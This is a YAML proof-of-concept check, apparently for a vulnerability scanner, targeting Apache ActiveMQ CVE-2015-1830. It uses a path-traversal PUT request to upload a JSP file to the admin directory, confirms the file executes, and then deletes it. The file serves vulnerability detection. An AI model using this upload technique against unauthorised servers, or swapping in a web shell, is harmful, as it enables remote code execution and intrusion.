name: poc-yaml-activemq-cve-2015-1830-traversal-upload
set:
  filename: randomLowercase(6)
  fileContent: randomLowercase(6)
rules:
  - method: PUT
    path: /fileserver/..\\admin\\{{filename}}.jsp
    body: '<% out.println("{{fileContent}}");%>'
    expression: |
      response.status == 204
  - method: GET
    path: >-
      /admin/{{filename}}.jsp
    expression: |
      response.status == 200 && response.body.bcontains(bytes(fileContent))
  - method: DELETE
    path: >-
      /admin/{{filename}}.jsp
    expression: |
      response.status == 200
detail:
  author: Jing Ling
  links:
    - https://activemq.apache.org/security-advisories.data/CVE-2015-1830-announcement.txt
    - https://github.com/QWERTYSKI/metaspoilt-framework/blob/master/documentation/modules/exploit/windows/http/apache_activemq_traversal_upload.md
